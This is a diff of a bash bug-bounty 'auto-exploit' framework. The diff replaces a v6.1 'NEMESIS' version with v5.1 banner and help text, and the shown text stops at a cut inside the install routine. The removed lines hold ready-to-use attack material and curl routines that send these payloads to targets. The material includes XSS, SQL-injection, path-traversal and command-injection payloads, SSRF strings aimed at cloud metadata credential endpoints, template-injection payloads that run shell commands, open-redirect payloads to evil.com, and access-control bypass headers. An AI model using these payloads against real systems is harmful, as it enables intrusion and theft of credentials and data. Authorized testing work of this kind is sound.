@@ -1,2103 +1,3405 @@
 #!/usr/bin/env bash
-# ═══════════════════════════════════════════════════════════════════════════
-#   BUG FRAMEWORK v6.1 — "NEMESIS NOISE-ZERO"
-#   Auto-Detect → Verify → Dedupe → Auto-Exploit → Prove
-#   AUTHORIZED & IN-SCOPE TARGETS ONLY
-#   Every finding is independently re-verified + deduplicated before it can
-#   be queued, exploited, or reported. Zero noise.
-# ═══════════════════════════════════════════════════════════════════════════
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║   BUG FRAMEWORK v5.1  —  Recon · Detection · AUTO-EXPLOITATION Suite         ║
+# ║   IDOR | BAC | OAuth | XSS | SQLi | SSRF | LFI | CMDi | CSRF | OWASP TOP 10 ║
+# ║   ⚡ AUTHORIZED & IN-SCOPE TARGETS ONLY — STRICTLY FOR BUG BOUNTY USE ⚡    ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+#
+# LEGAL NOTICE: This tool is for authorized security testing ONLY.
+# Running this against targets without explicit written permission is illegal.
+# The author assumes zero liability for unauthorized or illegal use.
+
 set -uo pipefail
 IFS=$'\n\t'
-shopt -s nullglob extglob
 
-VERSION="6.1"; NAME="NEMESIS"
-WS_BASE="${BUG_WS:-$HOME/bug-bounty}"
-DOMAIN=""; W=""; EX=""; LOG=""; START=$(date +%s); STEP=0; TOTAL=26
-G_FULL=false; EXPLOIT_COUNT=0
+# ══════════════════════════════════════════════════════
+# VERSION & META
+# ══════════════════════════════════════════════════════
+readonly VERSION="5.1"
+readonly TOOL_NAME="BUG FRAMEWORK"
 
-T_HTTPX=60; T_NUCLEI=50; R_NUCLEI=150; T_FFUF=120; T_KATANA=50
-D_KATANA=3; T_DALFOX=40; TO=10; MAX_SUBS_WB=30; RATE=0
-BACKOFF=0; RLAST=0; EXP_SQLI_T=900; EXP_DUMP=false
+# ══════════════════════════════════════════════════════
+# COLORS & SYMBOLS
+# ══════════════════════════════════════════════════════
+readonly RED='\033[0;31m'
+readonly GREEN='\033[0;32m'
+readonly YELLOW='\033[1;33m'
+readonly BLUE='\033[0;34m'
+readonly CYAN='\033[0;36m'
+readonly MAGENTA='\033[0;35m'
+readonly WHITE='\033[1;37m'
+readonly BOLD='\033[1m'
+readonly DIM='\033[2m'
+readonly NC='\033[0m'
+readonly ORANGE='\033[38;5;208m'
 
-F_QUICK=false; F_DEEP=false; F_NO_EXPLOIT=false; F_RESUME=false
-F_SILENT=false; F_DEBUG=false; F_STRICT=false; F_VERIFY_ONLY=false
-F_BANNER=true; F_INSTALL=false; F_UPDNUC=false
-F_HEADLESS=false; F_VERIFY_KEYS=false; F_SHELL=false; F_PARALLEL=false
-M_SUB=false; M_ONE=false; M_URL=false; M_WE=false; M_JS=false; M_FUZZ=false
-M_PORTS=false; M_VULN=false; M_NUC=false; M_XSS=false; M_SQLI=false
-M_SSRF=false; M_LFI=false; M_CSRF=false; M_CORS=false; M_IDOR=false
-M_OAUTH=false; M_TECH=false; M_WAF=false; M_API=false; M_PMF=false
-M_REPORT=false; M_SCOPE=false
-SCOPE_FILE=""; COOKIE=""; PROXY=""; CUSTOM_WL=""; COLLECTOR=""
-declare -a HDRS=() EXPLOITS=() A=()
-declare -A B_TITLE=() B_LEN=() VSEEN=()
+readonly SYM_OK="${GREEN}[✔]${NC}"
+readonly SYM_FAIL="${RED}[✖]${NC}"
+readonly SYM_WARN="${YELLOW}[!]${NC}"
+readonly SYM_INFO="${CYAN}[*]${NC}"
+readonly SYM_HIT="${RED}[💥]${NC}"
+readonly SYM_BUG="${MAGENTA}[🐛]${NC}"
 
-R=$'\e[0;31m'; G=$'\e[0;32m'; Y=$'\e[1;33m'; B=$'\e[0;34m'; C=$'\e[0;36m'
-M=$'\e[0;35m'; W2=$'\e[1;37m'; D=$'\e[2m'; N=$'\e[0m'
-OK="${G}[✔]${N}"; FAIL="${R}[✖]${N}"; WARN="${Y}[!]${N}"; INFO="${C}[*]${N}"; HIT="${R}[💥]${N}"
+# ══════════════════════════════════════════════════════
+# GLOBALS — set via parse_args
+# ══════════════════════════════════════════════════════
+DOMAIN=""
+WORKSPACE=""
+LOG_MASTER=""
+START_TIME=$(date +%s)
+SCAN_STEP=0
+SCAN_TOTAL=24
 
-# ─────────────────────────── LOGGING ───────────────────────────
-log() { local lvl=$1; shift; local ts; ts=$(date '+%H:%M:%S'); local msg=""
-  case $lvl in
-    I)  msg="${INFO} ${D}[${ts}]${N} $*" ;;
-    OK) msg="${OK} ${G}[${ts}]${N} $*" ;;
-    W)  msg="${WARN} ${Y}[${ts}]${N} ${W2}$*${N}" ;;
-    E)  msg="${FAIL} ${R}[${ts}]${N} $*" ;;
-    H)  msg="${HIT} ${W2}${R}[${ts}] ▶ $*${N}" ;;
-    S)  msg="${M}${W2}▚▚▚ [${ts}] $*${N}" ;;
-  esac
-  echo "$msg" >> "${LOG:-/tmp/bug.log}"
-  [[ "$F_SILENT" == true && "$lvl" != "H" ]] && return
-  [[ "$F_DEBUG" == false && "$lvl" == "I" ]] && return
-  echo -e "$msg"
-}
-step() { STEP=$((STEP+1)); local pct=$((STEP*100/TOTAL)) bar=""
-  for ((i=0;i<pct/4;i++)); do bar+="█"; done; for ((i=pct/4;i<25;i++)); do bar+="░"; done
-  log S "▸ [${bar}] ${pct}% — $1"
-}
+# Tunables
+T_HTTPX=50
+T_NUCLEI=50
+R_NUCLEI=150
+T_FFUF=100
+T_KATANA=50
+D_KATANA=3
+T_DALFOX=30
+TIMEOUT_CONN=10
+MAX_SUBS_WB=30
 
-# ─────────────────────────── CORE HELPERS ───────────────────────────
-has() { command -v "$1" &>/dev/null; }
-cnt() { wc -l < "${1:-/dev/null}" 2>/dev/null | tr -d ' '; }
-sn()  { echo "$1" | md5sum | cut -c1-12; }
-u()   { local f; for f in "$@"; do [[ -f "$f" ]] && sort -u -o "$f" "$f" 2>/dev/null || true; done; }
-qcount() { local c=0 e; for e in "${EXPLOITS[@]:-}"; do [[ "$e" == "$1"$'\t'* ]] && c=$((c+1)); done; echo "$c"; }
-UA_ARR=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15"
-        "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0"
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148")
-ua() { echo "${UA_ARR[$((RANDOM % ${#UA_ARR[@]}))]}"; }
-throttle() { [[ "$RATE" -le 0 ]] && return
-  local now gap wait; now=$(date +%s%N); gap=$((1000000000 / RATE))
-  wait=$(( gap - (now - RLAST) ))
-  [[ $wait -gt 0 ]] && sleep "$(awk "BEGIN{printf \"%.3f\", $wait/1000000000}")"
-  RLAST=$(date +%s%N)
-  [[ "$BACKOFF" -gt 0 ]] && { sleep "$BACKOFF"; BACKOFF=$((BACKOFF > 30 ? 0 : BACKOFF - 1)); }
-}
-mkhdr() { A=(); [[ -n "$COOKIE" ]] && A+=(-b "$COOKIE"); [[ -n "$PROXY" ]] && A+=(-x "$PROXY")
-  for h in "${HDRS[@]+"${HDRS[@]}"}"; do [[ -n "$h" ]] && A+=(-H "$h"); done; }
-curlx() { throttle; mkhdr; curl -s --max-time "$TO" --connect-timeout 5 -A "$(ua)" "${A[@]+"${A[@]}"}" "$@"; }
-RC=""; RB=""; RL=0
-probe() { local fol="" u=""; [[ "$1" == "-L" ]] && { fol="-L"; u="$2"; } || u="$1"
-  local tmp; tmp=$(mktemp)
-  RC=$(curlx $fol -o "$tmp" -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
-  [[ "$RC" == "429" || "$RC" == "503" ]] && BACKOFF=$((BACKOFF + 2))
-  RB=$(head -c 4000 "$tmp" 2>/dev/null || true); RL=$(wc -c < "$tmp" 2>/dev/null || echo 0)
-  rm -f "$tmp"
-}
-setparam() { local u=$1 n=$2 v=$3
-  if [[ "$u" =~ ([?&])${n}=[^&]* ]]; then echo "${u/${BASH_REMATCH[0]}/${BASH_REMATCH[1]}${n}=${v}}"
-  else echo "${u}&${n}=${v}"; fi
-}
+# Feature flags
+F_QUICK=false
+F_DEEP=false
+F_NO_EXPLOIT=false
+F_RESUME=false
+F_SILENT=false
+F_BANNER=true
+F_INSTALL=false
+F_UPDATE_NUCLEI=false
 
-# ─────────────────────────── NOISE-ZERO ENGINE ───────────────────────────
-norm() { local u=$1
-  u=$(echo "$u" | sed -E 's/#.*//; s/[?&]$//; s|/+$||')
-  u=$(echo "$u" | sed -E 's/([?&])(utm_[a-z]+|fbclid|gclid|ref|source|mc_cid|mc_eid)=[^&]*&?/\1/g; s/[?&]$//')
-  echo "$u"
-}
-fhash() { echo -n "$1|$2" | md5sum | cut -c1-16; }
-calibrate() { local u=$1 b resp
-  b=$(echo "$u" | grep -oP 'https?://[^/]+') || return
-  resp=$(curlx -- "${b}/__nemesis_probe_$RANDOM$RANDOM" 2>/dev/null)
-  B_TITLE["$b"]=$(echo "$resp" | grep -oiP '<title>[^<]*' | head -1 | cut -d'>' -f2- | tr '[:upper:]' '[:lower:]')
-  B_LEN["$b"]=${#resp}
-}
-soft404() { local u=$1 body=$2 b bt bl cl d
-  b=$(echo "$u" | grep -oP 'https?://[^/]+') || return 1
-  bt=$(echo "$body" | grep -oiP '<title>[^<]*' | head -1 | cut -d'>' -f2- | tr '[:upper:]' '[:lower:]')
-  [[ -n "${B_TITLE[$b]:-}" && "$bt" == "${B_TITLE[$b]}" ]] && return 0
-  bl=${B_LEN[$b]:-0}; cl=${#body}
-  if [[ $bl -gt 0 ]]; then d=$((cl - bl)); [[ $d -lt 0 ]] && d=$((-d)); [[ $d -lt 40 ]] && return 0; fi
-  return 1
-}
-verify() { local cls=$1 url=$2 payload=$3 key rb t0 t1 d1 d2 f tu
-  url=$(norm "$url"); key=$(fhash "$cls" "$url")
-  [[ -n "${VSEEN[$key]:-}" ]] && return 1
-  case "$cls" in
-    xss)      rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
-              soft404 "$url" "$rb" && return 1
-              echo "$rb" | grep -qiE "alert\(1\)|alert\(document\.domain\)|onerror=alert|srcdoc=" || return 1 ;;
-    sqli)     has qsreplace || return 1
-              tu=$(echo "$url" | qsreplace "' AND SLEEP(4)--" 2>/dev/null)
-              t0=$(date +%s%N); curlx -o /dev/null -- "$tu" 2>/dev/null; t1=$(date +%s%N)
-              (( (t1-t0)/1000000 < 3000 )) && return 1 ;;
-    lfi)      rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
-              { echo "$rb" | grep -qE '^root:[x*]:' || \
-                { echo "$rb" | tr -d '\n' | base64 -d 2>/dev/null | grep -qE '^root:[x*]:'; }; } || return 1 ;;
-    ssrf)     rb=$(curlx -L -- "$url" 2>/dev/null | head -c 4000)
-              echo "$rb" | grep -qE 'ami-id|computeMetadata|arn:aws|meta-data|user-data' || return 1 ;;
-    cmdi)     t0=$(date +%s%N); curlx -o /dev/null -- "$url" 2>/dev/null; t1=$(date +%s%N); d1=$(( (t1-t0)/1000000 ))
-              t0=$(date +%s%N); curlx -o /dev/null -- "$url" 2>/dev/null; t1=$(date +%s%N); d2=$(( (t1-t0)/1000000 ))
-              { [[ $d1 -lt 3000 || $d2 -lt 3000 ]] && return 1; } ;;
-    ssti)     rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
-              echo "$rb" | grep -qP '(^|[^0-9])49([^0-9]|$)' || { echo "$rb" | grep -q "7777777" || return 1; } ;;
-    csrf)     rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
-              echo "$rb" | grep -qiE '<form[^>]+method=["'"'"']?post' || return 1
-              echo "$rb" | grep -qiE '(csrf|_token|authenticity_token|nonce|__requestverificationtoken)' && return 1 ;;
-    cors)     rb=$(curlx -H "Origin: $payload" -I -- "$url" 2>/dev/null)
-              { echo "$rb" | grep -qi 'access-control-allow-credentials: *true' || \
-                echo "$rb" | grep -qi "access-control-allow-origin: *\*"; } || return 1 ;;
-    redirect) f=$(curlx -o /dev/null -w '%{url_effective}' -- "$url" 2>/dev/null)
-              echo "$f" | grep -qiE '^(https?://)?(www\.)?evil\.com' || return 1 ;;
-    oauth)    f=$(curlx -o /dev/null -w '%{url_effective}' -- "$url" 2>/dev/null)
-              echo "$f" | grep -qiE '^https?://[^/]*evil\.com' || return 1 ;;
-    bac)      rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
-              soft404 "$url" "$rb" && return 1
-              echo "$rb" | grep -qiE '(login|sign ?in|redirecting|forbidden)' && return 1 ;;
-    idor)     rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
-              soft404 "$url" "$rb" && return 1
-              echo "$rb" | grep -qiE '(login|sign ?in)' && return 1
-              echo "$rb" | grep -qiE '(\{|"id"|"name"|"data"|</)' || return 1 ;;
-    jwt)      echo "$url" | cut -d. -f1 | base64 -d 2>/dev/null | grep -qi '"alg"[^,]*"none"' || return 1 ;;
-    takeover) rb=$(curlx -- "$url" 2>/dev/null | head -c 1200)
-              echo "$rb" | grep -qiE 'heroku|github.*not found|azurewebsites|netlify.*not found|no such bucket' || return 1 ;;
-    *) ;;
-  esac
-  VSEEN["$key"]=1
-  echo "$url"
-}
-queue() { EXPLOITS+=("$1"$'\t'"$2"$'\t'"$3"$'\t'"$4"); }
-qverify() { local cls=$1 url=$2 payload=$3 sev=$4 ok
-  ok=$(verify "$cls" "$url" "$payload" 2>/dev/null) || return
-  [[ -z "$ok" ]] && return
-  queue "$cls" "$ok" "$payload" "$sev"
-  log H "[VERIFIED] $cls: $ok"
+# Mode flags
+M_SUB=false
+M_ONE=false
+M_URL=false
+M_WE=false
+M_JS=false
+M_FUZZ=false
+M_VULN=false
+M_NUCLEI_ONLY=false
+M_XSS=false
+M_SQLI=false
+M_SSRF=false
+M_LFI=false
+M_CSRF=false
+M_CORS=false
+M_IDOR=false
+M_OAUTH=false
+M_REPORT=false
+M_SCOPE=false
+M_WAF=false
+M_API=false
+M_PMF=false
+M_PORTS=false
+M_TECH=false
+M_EXPLOIT=false
+
+SCOPE_FILE=""
+SESSION_COOKIE=""
+PROXY_URL=""
+CUSTOM_WL=""
+CUSTOM_THREADS=""
+CUSTOM_RATE=""
+declare -a CUSTOM_HEADERS=()
+
+# ══════════════════════════════════════════════════════
+# BANNER
+# ══════════════════════════════════════════════════════
+print_banner() {
+    [[ "$F_BANNER" == false ]] && return
+    clear
+    echo -e "${RED}"
+    cat << 'BNREOF'
+ ██████╗ ██╗   ██╗ ██████╗     ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
+ ██╔══██╗██║   ██║██╔════╝     ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
+ ██████╔╝██║   ██║██║  ███╗    █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║██████╔╝█████╔╝
+ ██╔══██╗██║   ██║██║   ██║    ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║██╔══██╗██╔═██╗
+ ██████╔╝╚██████╔╝╚██████╔╝    ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
+ ╚═════╝  ╚═════╝  ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
+BNREOF
+    echo -e "${NC}"
+    echo -e "  ${DIM}╔────────────────────────────────────────────────────────────────────────────────╗${NC}"
+    echo -e "  ${DIM}│${NC}  ${BOLD}${WHITE}v${VERSION} ELITE · AUTO-EXPLOIT${NC}  ${DIM}│${NC}  ${CYAN}IDOR · BAC · OAuth · XSS · SQLi · SSRF · LFI · CMDi · CSRF · OWASP${NC}  ${DIM}│${NC}"
+    echo -e "  ${DIM}╚────────────────────────────────────────────────────────────────────────────────╝${NC}"
+    echo -e "  ${RED}${BOLD}⚡  AUTHORIZED & IN-SCOPE TARGETS ONLY  ⚡${NC}"
+    echo ""
 }
 
-# ─────────────────────────── PAYLOAD PACKS ───────────────────────────
-XSS_P=('<script>alert(document.domain)</script>' '<img src=x onerror=alert(1)>' '<svg/onload=alert(1)>'
-       '"><svg/onload=alert(1)>' "'-alert(1)-'" '<iframe srcdoc="<script>alert(1)</script>">')
-SQLI_DET=("' OR 1=1--" "' OR '1'='1" "') OR ('1'='1" '" OR 1=1--' "1;SELECT SLEEP(2)--" "' AND SLEEP(2)--")
-LFI_P=('../../../../etc/passwd' '..%2F..%2F..%2F..%2Fetc%2Fpasswd' '....//....//....//etc/passwd'
-       '%2e%2e%2f%2e%2e%2fetc%2fpasswd' '/etc/passwd%00' '..%252f..%252f..%252fetc%252fpasswd'
-       'php://filter/read=convert.base64-encode/resource=/etc/passwd' '/proc/self/environ'
-       '/var/log/apache2/access.log' '/var/log/nginx/access.log' '/etc/hostname')
-SSRF_P=('http://169.254.169.254/latest/meta-data/' 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
-        'http://metadata.google.internal/computeMetadata/v1/?recursive=true' 'http://100.100.100.200/latest/meta-data/'
-        'http://127.0.0.1' 'http://0x7f000001' 'http://2130706433' 'http://[::1]'
-        'dict://127.0.0.1:11211/stats' 'gopher://127.0.0.1:6379/_INFO' 'file:///etc/passwd')
-CMDI_DET=(';sleep 3' '|sleep 3' '`sleep 3`' '$(sleep 3)' '& sleep 3' ';ping -c 3 127.0.0.1')
-SSTI_PROBES=('{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '*{7*7}' '{{7*'"'"'7'"'"'}}')
-SSTI_RCE=('Jinja2|{{cycler.__init__.__globals__.os.popen("id").read()}}'
-          'Twig|{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
-          'Freemarker|<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
-          'Velocity|#set($e="x")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")'
-          'ERB|<%= system("id") %>' 'Pebble|{{type.getInstance().exec("id")}}')
-REDIRECT_P=('https://evil.com' '//evil.com' 'https://evil.com/%2f..' 'https://evil.com%2f..' '/\evil.com' 'https:evil.com')
-HDR_BYPASS=('X-Original-URL: %P%' 'X-Rewrite-URL: %P%' 'X-Override-URL: %P%' 'X-Forwarded-For: 127.0.0.1'
-            'X-Real-IP: 127.0.0.1' 'X-Custom-IP-Authorization: 127.0.0.1' 'CF-Connecting-IP: 127.0.0.1'
-            'X-Host: localhost' 'X-Forwarded-Host: localhost')
-PATH_TRICKS=('%2e' '/' '//' '/.' '/..' '/%2f' '%20' '%09' '/.' '..;/' '?x' '/./' '%3f' '#' '/%2e')
-META_FILES=('/.env' '/.env.local' '/.env.production' '/.git/config' '/.git/HEAD' '/.git/COMMIT_EDITMSG'
-  '/config.php' '/config.yml' '/config.json' '/wp-config.php' '/wp-config.php.bak' '/database.yml'
-  '/docker-compose.yml' '/Dockerfile' '/package.json' '/phpinfo.php' '/server-status' '/.htpasswd'
-  '/actuator' '/actuator/env' '/actuator/heapdump' '/actuator/mappings' '/metrics' '/swagger.json'
-  '/api-docs' '/openapi.json' '/swagger-ui.html' '/.DS_Store' '/backup.sql' '/dump.sql' '/robots.txt'
-  '/.well-known/security.txt' '/.aws/credentials' '/web.config' '/crossdomain.xml')
-API_PATHS=('/swagger.json' '/swagger-ui.html' '/api-docs' '/api-docs.json' '/api/swagger.json'
-  '/openapi.json' '/openapi.yaml' '/v1/api-docs' '/v2/api-docs' '/v3/api-docs' '/redoc' '/.well-known/openapi')
-GQL_PATHS=('/graphql' '/api/graphql' '/graphiql' '/v1/graphql' '/gql' '/query' '/api/query')
-TECH_PATHS=('wordpress|/wp-json/wp/v2/users' 'wordpress|/wp-login.php' 'wordpress|/xmlrpc.php'
-  'laravel|/telescope/requests' 'laravel|/_ignition/share-report' 'laravel|/_debugbar'
-  'spring|/actuator/env' 'spring|/actuator/heapdump' 'drupal|/CHANGELOG.txt' 'drupal|/update.php')
-WAF_ENC=("" "%3Cscript%3Ealert(1)%3C/script%3E" "<scr%00ipt>alert(1)</scr%00ipt>" "<scrİpt>alert(1)</scrİpt>"
-         "%u003cscript%u003ealert(1)" "<script>alert/**/(1)</script>" "<scr\tipt>alert(1)</scr\tipt>" "<svg onload=alert&lpar;1&rpar;>")
+# ══════════════════════════════════════════════════════
+# HELP
+# ══════════════════════════════════════════════════════
+show_help() {
+    print_banner
+    cat << 'HELPEOF'
+FULL SCAN MODES
+  bug -d <domain>                   Full aggressive recon + detection + AUTO-EXPLOITATION
+  bug -d <domain> --quick           Fast scan (skip slow/heavy modules)
+  bug -d <domain> --deep            Ultra aggressive (max threads + deep wordlists)
+  bug -d <domain> --no-exploit      Recon + detection only (no active fuzzing)
+  bug -d <domain> --resume          Resume a stopped scan from last checkpoint
 
-# ─────────────────────────── EMBEDDED PYTHON HELPERS ───────────────────────────
-make_helpers() {
-  mkdir -p "$W/tools"
-  cat > "$W/tools/js_dl.py" <<'PYDL'
-import sys,os,hashlib,concurrent.futures as cf,urllib.request
-def dl(u,d):
-    try:
-        p=os.path.join(d,hashlib.sha1(u.encode()).hexdigest()[:16]+".js")
-        if os.path.exists(p): return u,"skip"
-        req=urllib.request.Request(u,headers={"User-Agent":"Mozilla/5.0"})
-        b=urllib.request.urlopen(req,timeout=15).read(2_000_000)
-        if b: open(p,"wb").write(b); return u,len(b)
-    except Exception as e: return u,str(e)[:50]
-    return u,"empty"
-d,src=sys.argv[1],sys.argv[2]
-urls=[l.strip() for l in open(src) if l.strip()]
-with cf.ThreadPoolExecutor(max_workers=25) as ex:
-    for u,r in ex.map(lambda u:dl(u,d),urls): print(f"{r}\t{u}")
-PYDL
-  cat > "$W/tools/active.py" <<'PYAC'
-import sys,concurrent.futures as cf,urllib.request,urllib.error
-KEEP=(200,201,204,301,302,307,401,403,405,500)
-def chk(u):
-    try:
-        try: r=urllib.request.urlopen(urllib.request.Request(u,method="HEAD",headers={"User-Agent":"Mozilla/5.0"}),timeout=8)
-        except urllib.error.HTTPError as e: r=e
-        return u if getattr(r,"status",getattr(r,"code",0)) in KEEP else None
-    except Exception: return None
-urls=[l.strip() for l in sys.stdin if l.strip()]
-lim=int(sys.argv[1]) if len(sys.argv)>1 else 50
-with cf.ThreadPoolExecutor(max_workers=40) as ex:
-    for u in ex.map(chk,urls[:lim*6]):
-        if u: print(u)
-PYAC
-  cat > "$W/tools/form_scrape.py" <<'PYFS'
-import sys,re,urllib.request,urllib.parse,concurrent.futures as cf
-def scrape(u):
-    try:
-        h=urllib.request.urlopen(urllib.request.Request(u,headers={"User-Agent":"Mozilla/5.0"}),timeout=10).read().decode("utf-8","ignore")
-        out=[]
-        for fm in re.finditer(r"<form[^>]*>(.*?)</form>",h,re.S|re.I):
-            tag=fm.group(0)
-            m=re.search(r'method=["\']?(\w+)',tag,re.I); method=m.group(1).upper() if m else "GET"
-            a=re.search(r'action=["\']([^"\']+)',tag,re.I)
-            action=urllib.parse.urljoin(u,a.group(1)) if a else u
-            ins=[]
-            for el in re.finditer(r"<(?:input|select|textarea)[^>]*>",fm.group(1),re.I):
-                s=el.group(0); nm=re.search(r'name=["\']([^"\']+)',s,re.I)
-                if not nm: continue
-                val=re.search(r'value=["\']([^"\']*)',s,re.I)
-                ins.append(f"{nm.group(1)}={val.group(1) if val else ''}")
-            if ins: out.append(f"{action}\t{method}\t{','.join(ins)}")
-        return out
-    except Exception: return []
-urls=[l.strip() for l in sys.stdin if l.strip()]
-with cf.ThreadPoolExecutor(max_workers=20) as ex:
-    for res in ex.map(scrape,urls):
-        for r in res: print(r)
-PYFS
-  cat > "$W/tools/js_paths.py" <<'PYP'
-# JS -> PATHS ONLY (scheme/host stripped, assets dropped, deduped in-set)
-import sys,os,re,urllib.parse
-d=sys.argv[1]; paths=set()
-for f in os.listdir(d):
-    if not f.endswith(".js"): continue
-    try: s=open(os.path.join(d,f),encoding="utf-8",errors="ignore").read()
-    except: continue
-    for m in re.finditer(r'''['"`]((?:https?:)?//[^'"`\s]+|/[^'"`\s]*|(?:\.{1,2}/)?[a-zA-Z0-9_./-]{3,}(?:\?[^'"`\s]*)?)['"`]''',s):
-        v=m.group(1)
-        if v.startswith("//") or v.startswith("http"):
-            v=urllib.parse.urlsplit(v if "//" in v else "https:"+v).path
-        else:
-            v=urllib.parse.urlsplit(v).path or v
-        if not v.startswith("/"): v="/"+v.lstrip("./")
-        if len(v)>1 and not re.search(r'\.(png|jpe?g|gif|css|woff2?|ttf|eot|svg|ico|mp4|mp3|zip|gz|map)$',v,re.I):
-            paths.add(v)
-for p in sorted(paths): print(p)
-PYP
-  chmod +x "$W/tools/"*.py
+RECON MODES
+  bug -d <domain> -sub              Subdomain enumeration only
+  bug -d <domain> -one              Single domain only (no subdomain enum)
+  bug -d <domain> -url              URL collection only
+  bug -d <domain> -we               URL + endpoint discovery (fast combo)
+  bug -d <domain> -js               JavaScript analysis only
+  bug -d <domain> -fuzz             Directory bruteforce + 403 bypass
+  bug -d <domain> -ports            Port scan only (nmap)
+  bug -scope <file>                 Scan multiple domains from file
+
+DETECTION MODES
+  bug -d <domain> -vuln             Full detection scan
+  bug -d <domain> -exploit          AUTO-EXPLOIT confirmed findings (chain)
+  bug -d <domain> -nuclei           Nuclei only
+  bug -d <domain> -xss              XSS detection only (dalfox)
+  bug -d <domain> -sqli             SQLi detection only (sqlmap)
+  bug -d <domain> -ssrf             SSRF detection only
+  bug -d <domain> -lfi              LFI detection only
+  bug -d <domain> -csrf             CSRF + CORS detection
+  bug -d <domain> -cors             CORS only
+  bug -d <domain> -idor             IDOR + BAC classification
+  bug -d <domain> -oauth            OAuth/Auth flow analysis
+  bug -d <domain> -tech             Technology-specific checks
+  bug -d <domain> -waf              WAF fingerprint + bypass profiling
+  bug -d <domain> -api              API schema discovery (OpenAPI/GraphQL)
+  bug -d <domain> -pmf              Parameter mutation fuzzing (SSTI/hidden/JSON)
+
+REPORT
+  bug -d <domain> -report           Regenerate HTML + MD report
+
+OPTIONS (apply to any mode)
+  --cookie  <value>                 Session cookie (authenticated scans)
+  --header  <value>                 Custom header (repeatable)
+  --proxy   <url>                   Route traffic through proxy (Burp etc)
+  --wordlist <file>                 Custom wordlist for fuzzing
+  --threads <n>                     Override thread count
+  --rate    <n>                     Override requests per second
+  --timeout <n>                     Override connection timeout
+  --silent                          Suppress verbose, show findings only
+  --no-banner                       Skip ASCII art banner
+
+UTILITY
+  bug --install                     Install all required tools
+  bug --update-nuclei               Update nuclei templates only
+  bug -h / --help                   Show this help
+
+HELPEOF
+    exit 0
 }
 
-# ─────────────────────────── WORKSPACE / RESUME ───────────────────────────
-setup_ws() {
-  W="$WS_BASE/$DOMAIN"; EX="$W/exploits"
-  mkdir -p "$W"/{subs,urls/gf,js/dl,js/paths,paths,params,endpoints,vulns,\
-classified/{idor,bac,oauth},exploits/{sqli,ssrf,lfi,cmdi,ssti,xss,idor,bac,oauth,jwt,csrf,cors,redirect,takeover},reports,logs}
-  LOG="$W/logs/master.log"; touch "$LOG"
-  make_helpers
-  echo "TARGET=$DOMAIN VERSION=$VERSION AUTH=$([ -n "$COOKIE" ] && echo YES || echo NO) PROXY=${PROXY:-NONE}" > "$W/scan_config.txt"
-  log I "Workspace: $W"
-}
-mark()   { echo "$1" >> "$W/.done" 2>/dev/null || true; }
-is_done(){ [[ "$F_RESUME" == true ]] && grep -qx "$1" "$W/.done" 2>/dev/null; }
-run_mod(){ local name=$1 fn=$2; shift 2
-  if is_done "$name"; then log I "SKIP $name (resumed)"; return; fi
-  "$fn" "$@" || log W "module $name exited non-zero"
-  mark "$name"; }
-ensure_live() {
-  [[ -s "$W/subs/live.txt" ]] && return
-  log I "quick probe (no recon data)…"
-  { echo "https://$DOMAIN"; subfinder -d "$DOMAIN" -silent 2>/dev/null \
-    | httpx -silent -threads "$T_HTTPX" -timeout "$TO"; } | sort -u > "$W/subs/live.txt"
-  cp "$W/subs/live.txt" "$W/subs/status_200.txt" 2>/dev/null || true
-  touch "$W/subs/status_403.txt" "$W/subs/tech.txt"
-  while IFS= read -r u; do calibrate "$u"; done < <(head -10 "$W/subs/live.txt" 2>/dev/null || true)
-}
-ensure_urls() {
-  [[ -s "$W/urls/all.txt" ]] && return
-  ensure_live
-  { echo "$DOMAIN" | timeout 60 waybackurls 2>/dev/null
-    echo "$DOMAIN" | timeout 60 gau --threads 5 2>/dev/null
-  } | sort -u > "$W/urls/all.txt"
-  grep -E '\?[a-zA-Z0-9_%-]+=' "$W/urls/all.txt" | sort -u > "$W/urls/params.txt"
-  for p in xss sqli ssrf redirect lfi rce idor interestingparams; do
-    gf "$p" "$W/urls/all.txt" 2>/dev/null | sort -u > "$W/urls/gf/$p.txt"
-  done
-  grep -oP '[?&][a-zA-Z0-9_%-]+=' "$W/urls/params.txt" | sed 's/^[?&]//;s/=//' | sort -u > "$W/params/all.txt"
-}
-
-# ─────────────────────────── INSTALL ───────────────────────────
-install() {
-  log I "Installing tools…"
-  export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin" GOPATH="$HOME/go"
-  sudo apt-get update -qq 2>/dev/null || true
-  for p in python3 python3-pip curl wget git jq nmap sqlmap; do has "$p" || sudo apt-get install -y -qq "$p" 2>/dev/null; done
-  has go || { wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz -O /tmp/go.tgz \
